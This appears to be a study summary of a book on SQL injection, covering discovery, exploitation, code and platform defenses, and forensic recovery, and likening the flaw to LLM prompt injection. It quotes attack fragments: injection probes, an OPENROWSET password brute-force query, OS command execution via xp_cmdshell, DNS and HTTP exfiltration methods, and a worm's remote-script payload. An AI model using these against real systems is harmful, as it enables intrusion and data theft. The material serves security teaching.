# SQL Injection Attacks and Defense (2nd Edition)

ISBN: 9781597499637  |  Book #25

## One-liner
The definitive multi-author field manual on SQL injection, covering the full lifecycle from discovery and exploitation across SQL Server / Oracle / MySQL / PostgreSQL to code-level defenses, platform hardening, and post-breach forensic recovery.

## Thesis
SQL injection arises from a single root cause: an application incorrectly maps data into the SQL control plane by building queries through dynamic string concatenation of untrusted input, regardless of language or database. The book argues that no single countermeasure suffices; effective defense requires defense-in-depth layering parameterized statements, whitelist validation, context-aware output encoding, and canonicalization at the code level, with platform hardening (WAFs, least-privilege logins, stored procedures, network segmentation) as complementary virtual patching. Its second-edition thesis extends defense temporally: because attackers continually adapt, a holistic strategy must also cover detection, forensic confirmation, and disciplined recovery after a breach, not just prevention before one.

## Structure
### Ch 1 - What Is SQL Injection / Understanding SQL Injection
Defines the vulnerability via the three/four-tier web architecture and dynamic string building. Walks the canonical login.php / CMSUsers bypass, distinguishes GET vs POST parameters, and roots the flaw in escape-character, type-handling, and query-assembly idiosyncrasies. Frames SQLi against CVE/OWASP injection rankings and high-profile defacements (Zone-H).

### Ch 2 - Testing for SQL Injection
Inference methodology: trigger anomalies, identify injectable data, manipulate GET/POST parameters. Per-database error fingerprinting (Microsoft OLE DB, ORA-, MySQL, PostgreSQL). Inline function tests for numbers (51-ASCII(2)) and strings (concatenation sho'+'es), blind detection, time delays, and automated discovery tools (HP WebInspect/Scrawlr, IBM Rational AppScan, Paros, SQLiX, Zed Attack Proxy).

### Ch 3 - Reviewing Code for SQL Injection
Static/dynamic source review across PHP, Java (JDBC), C#/.NET, and Oracle PL/SQL / Transact-SQL. Taint analysis with sources, sinks, and dangerous functions (mysql_query, EXECUTE, EXEC()). Coverage of stored-procedure injection (authid, EXECUTE IMMEDIATE) and automated SCAs: Pixy, RIPS, CAT.NET, YASCA, LAPSE+, AST/CFG/lexical analysis.

### Ch 4 - Exploiting SQL Injection
UNION-based extraction (matching column count via ORDER BY/NULLs, reconciling data types with CAST). Error-based extraction, conditional statements (time/error/content), per-platform schema enumeration (sysobjects/syscolumns; information_schema; pg_class; all_tables), privilege escalation (OPENROWSET sa brute-force, sp_addsrvrolemember; Oracle SYS.LT, cursor injection, CREATE PROCEDURE), injecting into INSERT, and password-hash theft and cracking.

### Ch 5 - Blind SQL Injection Exploitation
Inference when no data/errors return. Binary-search (bisection) vs bit-by-bit extraction using SUBSTRING/ASCII; time-based delays (WAITFOR DELAY, BENCHMARK, SLEEP, pg_sleep, DBMS_LOCK.SLEEP, UTL_INADDR); response-based TRUE/FALSE inference; heavy queries; out-of-band channels (DNS, email, HTTP, ICMP, database connections via OPENROWSET/dblink). Worked example extracting 'sql08' in 115 requests, byte 14 in 8 questions.

### Ch 6 - Exploiting the Operating System
Reading/writing files and executing OS commands. SQL Server xp_cmdshell, sp_OACREATE/sp_OAMethod, CLR (CREATE/ALTER ASSEMBLY, csc.exe), BULK INSERT/BCP. MySQL LOAD_FILE/INTO DUMPFILE/UDFs. PostgreSQL COPY and imported libc system(). Oracle EXTPROC, DBMS_SCHEDULER, PL/SQL Native, Java RUNJAVA, UTL_FILE/DBMS_ADVISOR. Consolidating access via Meterpreter and SOAP endpoints; Oracle rootkit (update sys.user$).

### Ch 7 - Advanced Topics (Filter Evasion, Second-Order, Client-Side, Hybrid)
Evading input-validation filters: case variation, /**/ comments, URL/double-URL/Unicode encoding, CHAR()/CHR(), null bytes %00, keyword nesting (SELSELECTECT), buffer truncation. Second-order injection (a'+@@version+'a stored then executed). Client-side HTML5 Web SQL (openDatabase/executeSql) injection. Hybrid attacks: SQLi-to-XSS, OS commands via SQL*Plus, and CSRF against authenticated injection.

### Ch 8 - Code-Level Defenses
Domain Driven Security with validated value objects (Username with Pattern ^[a-z]{4,20}$). Parameterized statements across Java/Hibernate, ADO.NET, PHP (mysqli/PDO/pg_query_params), PL/SQL, iOS FMDB, Android, HTML5. Whitelist over blacklist validation, ESAPI, Oracle dbms_assert. Encoding to the database per platform, LIKE/ESCAPE wildcard quoting, NoSQL ($where) safety, canonicalization/NFKC Unicode normalization, stored procedures, abstraction layers, sensitive-data handling, honeypot tables.

### Ch 9 - Platform-Level Defenses
Runtime protection without code changes: WAFs (ModSecurity SecRule rule language, Core Rule Set, anomaly scoring, transformation functions, response analysis), IIS ISAPI filters (UrlScan, WebKnight), application filters (ESAPI WAF, SPF, HDIV), AOP, page-overriding/URL-rewriting, database firewalls (GreenSQL). Securing the database: least-privilege/segregated logins, revoke PUBLIC, drop dangerous procs, encryption, Oracle error triggers, patching, and deployment hardening to reduce discovery.

### Ch 10 - Confirming and Recovering from SQL Injection Attacks
Forensically sound investigation: dcfldd imaging + SHA1 hashing, chain of custody, stdout piping. Analyzing artifacts: web server logs via Microsoft Log Parser (spear-searching for 'pangolin', bandwidth/hit anomalies), database execution plans (sys.dm_exec_query_stats, gv$sql), transaction logs (fn_dblog, V$LOGMNR_CONTENTS, mysqlbinlog), object timestamps. Lilupophilupop worm case. Containment (pull network cable, not power), data assessment, notification, static vs dynamic payload recovery.

### Ch 11 - References (SQL Primer, Quick Reference, Filter Bypass, Other Platforms)
SQL primer (SELECT/INSERT/UPDATE/DELETE/UNION/DROP, dangerous OR 1=1 against UPDATE/DELETE). Platform-identification via time delay and SQL-dialect inference. Per-platform cheat sheets (config/schema enumeration, blind functions, privilege escalation, file I/O, password cracking) for SQL Server, MySQL, Oracle, PostgreSQL, plus DB2, Informix, Ingres, Sybase, Access. Quote/HTTP encoding bypass tables, troubleshooting reference, and tool/whitepaper resource lists.

## Core ideas
- SQL injection is fundamentally a data-context confusion: user input crosses from the data plane into the control (SQL) plane because the query is assembled by string concatenation. Every defense ultimately works by keeping that boundary intact.
- The root cause is database-agnostic and language-agnostic; the same flaw manifests in PHP, Java, C#, PL/SQL, mobile (iOS/Android), and even client-side HTML5 Web SQL Database, which is why the book teaches a single mental model then specializes per platform.
- Parameterized statements (bind variables) are the primary code-level fix because the query is compiled before data is supplied, but they cannot parameterize SQL identifiers (table/column names, ORDER BY columns), so those still require whitelist validation.
- Whitelisting (known-good) is strictly superior to blacklisting (known-bad); blacklists are inevitably incomplete and must never be used alone, only as a supplementary control combined with output encoding.
- Blind SQL injection turns a one-bit oracle (true/false, fast/slow) into full data extraction via binary search or bit-by-bit inference; absence of error messages or returned data is not a defense.
- Out-of-band channels (DNS, email/SMTP, HTTP, ICMP, raw DB connections) let an attacker exfiltrate data even when the application returns nothing, which is why egress network controls on the database server matter as much as ingress.
- Defense-in-depth is the organizing principle: platform-level controls (WAF, hardened DB, least privilege, network segmentation) do not fix the bug but act as virtual patches and impact limiters; they buy time, they do not substitute for secure code.
- Least-privilege database logins and stored-procedure-only access dramatically shrink blast radius: if the app login has only EXECUTE on procedures and no direct table rights, a successful injection yields far less.
- Second-order injection defeats naive input filtering: malicious input stored safely (e.g. via parameterized INSERT) becomes dangerous later when read back and concatenated into dynamic SQL, so output/re-use encoding is required, not just input validation.
- Canonicalization must precede validation: because a single quote has many encodings (%27, %2527, %u0027, &#39;, %ca%b9), filters that run before decoding are trivially bypassed; reduce to canonical form (or reject non-canonical input) first.
- Detection and forensics are first-class defenses: web server logs, database execution plans, transaction logs, and object timestamps each independently confirm whether an attempted injection was actually executed and successful, distinguishing 'logged attempt' from 'successful exploit'.
- Incident recovery hinges on classifying the payload as static (deterministic worm, roll back known transactions) versus dynamic (ad-hoc attacker, restore full RDBMS + OS and assume backdoors), and on chain-of-custody discipline from the very first action.

## Techniques and methods
- Inline-function substitution test: replace a numeric param with an equivalent SQL expression (ID=51-ASCII(2) equals ID=1) or split a string with platform-specific concatenation (SQL Server sho'+'es, Oracle/PostgreSQL sho'||'es, MySQL sho' 'es) to confirm injectability.
- Conditional response test: compare ' AND 1=1-- vs ' AND 1=2-- (and parenthesis-closing variants ') AND 1=1--) to detect a flaw via differential page behavior.
- UNION SELECT column reconciliation: use ORDER BY n to count columns, then NULLs / CAST to satisfy data-type compatibility; switch to UNION ALL SELECT to defeat image-column DISTINCT-compare errors.
- Error-based extraction: divide-by-zero, CONVERT(INT, @@VERSION), GROUP BY/HAVING column enumeration, and Oracle utl_inaddr.get_host_name / CTXSYS.DRITHSX.SN to surface data inside error strings.
- Blind inference via binary search (bisection on ASCII(SUBSTRING(...))) and bit-by-bit extraction (FN_REPLINTTOBITSTRING / bitwise AND), reducing a byte to 7-8 boolean questions.
- Time-based fingerprinting/extraction: WAITFOR DELAY '0:0:10' (SQL Server), BENCHMARK(1000000,MD5('X')) / SLEEP(10) (MySQL), pg_sleep(10) (PostgreSQL), DBMS_LOCK.SLEEP / UTL_INADDR (Oracle), plus 'heavy query' CPU consumption.
- OPENROWSET sa reauthentication brute-force (SELECT * FROM OPENROWSET('SQLOLEDB','127.0.0.1';'sa';'pw',...)) automated with Burp Intruder sniper + preset password list.
- OS command execution: xp_cmdshell and its sp_OACREATE 'wscript.shell' alternative (SQL Server), INTO DUMPFILE startup batch / UDF (MySQL), imported libc system() via CREATE FUNCTION (PostgreSQL), EXTPROC/DBMS_SCHEDULER/PL-SQL-Native (Oracle).
- Out-of-band exfiltration: xp_dirtree + FN_VARBINTOHEXSTR over DNS (labels max 63 chars, UNC paths max 128), UTL_HTTP.REQUEST / HTTPURITYPE.getclob() over arbitrary TCP ports, UTL_SMTP email channel.
- Domain Driven Security value object: wrap input in a validated immutable type whose constructor enforces Pattern.compile("^[a-z]{4,20}$"), so invalid data cannot exist as the type.
- Parameterized statement patterns: JDBC PreparedStatement (1-based setString), Hibernate named :param, ADO.NET @param/:param/positional ?, PHP mysqli bind_param('ss',...) / pg_query_params $1 / PDO bindParam.
- Encoding to the database: double the single quote (replace("'","''")), four-quote it inside PL/SQL/T-SQL stored procs, MySQL backslash-quote, PostgreSQL pg_escape_string / dollar-quoting; quote LIKE wildcards and use an ESCAPE clause.
- Oracle dbms_assert input validation (SIMPLE_SQL_NAME, ENQUOTE_NAME, SCHEMA_NAME, QUALIFIED_SQL_NAME) for FROM-clause identifiers that cannot be parameterized; never use NOOP.
- Unicode canonicalization with NFKC normalization (Java Normalizer.normalize, C# String.Normalize(FormKC), PHP I18N_UnicodeNormalizer) plus UTF-8-validity regex table before validating.
- ModSecurity SecRule rule language: VARIABLE / OPERATOR / ACTIONS, phase:2 targets (ARGS, REQUEST_COOKIES, XML), transformation chain (t:none ... t:replaceComments), anomaly-score thresholds, and whitelist virtual patches.
- Forensic confirmation via Microsoft Log Parser SQL over IIS/Apache logs (bandwidth-by-day, hits-by-IP, malicious cs-uri-query, spear-search LIKE '%pangolin%'), execution-plan recovery (sys.dm_exec_query_stats CROSS APPLY sys.dm_exec_sql_text; gv$sql), transaction log reads (fn_dblog, V$LOGMNR_CONTENTS, mysqlbinlog), Oracle AFTER SERVERERROR trigger logging ORA-1756/1789 etc.
- Static vs dynamic payload recovery procedure: backup victim DB twice, extract unique malicious queries, comprehend logic, cross-reference references, classify payload, treat any single dynamic payload as the high-water mark; static = roll back known transactions (LogMiner Flashback), dynamic = restore full RDBMS+OS.

## Memorable
- The four primary databases throughout: Microsoft SQL Server, Oracle, MySQL, PostgreSQL; with cheat sheets also for DB2, Informix, Ingres, Sybase, and Microsoft Access.
- Real bank IR case: a press-release 'News' id parameter exposed mortgage applications (names, SSNs, address/job history) for nearly 10,000 customers, who all received written apologies and identity-theft protection.
- sqlninja OPENROWSET sa brute-force in the worked example cracked password 's3cr3t' in 834 seconds; the chicken-counting blind example extracted username 'sql08' in 115 requests and resolved byte 14 in 8 questions.
- 2009 antivirus vendor (Kaspersky) SQLi: a database forensics expert confirmed the site was compromised but proved the attacker did NOT access the claimed customer data, narrowly scoping the breach and cutting recovery cost.
- The lilupophilupop SQL injection worm (November 2011) used a cursor over INFORMATION_SCHEMA columns to inject '"></title><script src="http://lilupophilupop.com/sl.php"></script>' into every text column over 30 chars.
- Pangolin tool footprint: pangolin_test_table plus hex-encoded payloads like 0x43003a005c005c0069006e0065007400700075006200 decoding to C:\\inetpub via xp_dirtree.
- sqlmap can generate over 1300 execution plans just enumerating a SQL Server banner via blind inference, making it stand out 'like a sore thumb' in the plan cache.
- DNS exfiltration constraints: DNS labels max 63 characters, UNC paths max 128 characters; xp_dirtree + FN_VARBINTOHEXSTR is the SQL Server channel.
- SQL Server 2000 sa hash dissection: 0x0100 constant (4 bytes), 8-byte salt (e.g. 236A261C), then 40-byte case-sensitive hash + 40-byte uppercased hash; SQL Server 2005 drops the case-insensitive copy. Crack with Cain & Abel / John the Ripper.
- Never inject OR 1=1 into an UPDATE or DELETE: the book's anecdote of resetting every user's password to 'letmein' and being 'beaten with a stick' - always back up before assessment; OWASP ZAP injects OR 1=1 too.
- Defense definition framing (Ch 10): 'the resistance against danger, attack, or harm' - extended to argue an organization that cannot confirm or recover from an attack is itself undefended.
- Per-author chapters: Justin Clarke (lead), with Erlend Oftedal (Ch 8 code defenses), Kevvie Fowler (Ch 10 forensics), Gary O'Leary-Steele (Ch 11 references), and Alexander Kornbrust's Oracle AFTER SERVERERROR trigger script (Red-Database-Security).
- NFKC is the recommended Unicode normalization form for input validation (Normalization Form KC, Compatibility Decomposition + Canonical Composition).
- Hash storage guidance evolves across editions: avoid MD5/SHA-1 (collision-susceptible), prefer SHA-2 family or password-specific algorithms bcrypt/scrypt, always per-user salted.

## Curriculum fit
For the security-research strand this is a primary-source reference: a deep, falsifiable, artifact-grounded treatment of one vulnerability class that models exactly the verification-over-scanning discipline the NuClide methodology demands. Its 'attempted (in logs) vs successful (in execution plans)' distinction is the same load-bearing verification stage that separates a candidate from a finding, and Chapter 10's forensic confirmation maps directly onto a 200-with-data read standard. The per-platform enumeration cheat sheets and out-of-band channels are reusable primitives for chaining low+medium findings into critical paths, and the OPENROWSET/dblink/UTL_HTTP techniques generalize to any data-layer trust-relationship abuse. For the agentic-AI-research strand it is foundational analog reading: the structural lesson - injection happens whenever untrusted data and trusted control share a serialized channel - is the exact failure mode of LLM prompt injection and tool-calling, and the book's Chapter 8 NoSQL/JSON/XPath/LDAP warning ('whenever you concatenate data and control, identify the contexts and encode for each') is the cleanest statement of the prompt-injection problem written years before LLMs. The defense taxonomy (parameterize = separate data from code; whitelist; canonicalize before validate; defense-in-depth; least privilege) transfers almost verbatim to designing safe agent tool interfaces and is a strong companion to CaMeL-style data/control separation. For leadership/creativity it is a model of multi-author technical synthesis and narrative reporting (war-story IR anecdotes that make risk felt), reinforcing the report-as-art and business-context standards. The main gap is currency: written ~2012, it predates ORM-heavy stacks and modern WAF/ML detection, so pair it with current advisories - but the conceptual core has not aged.
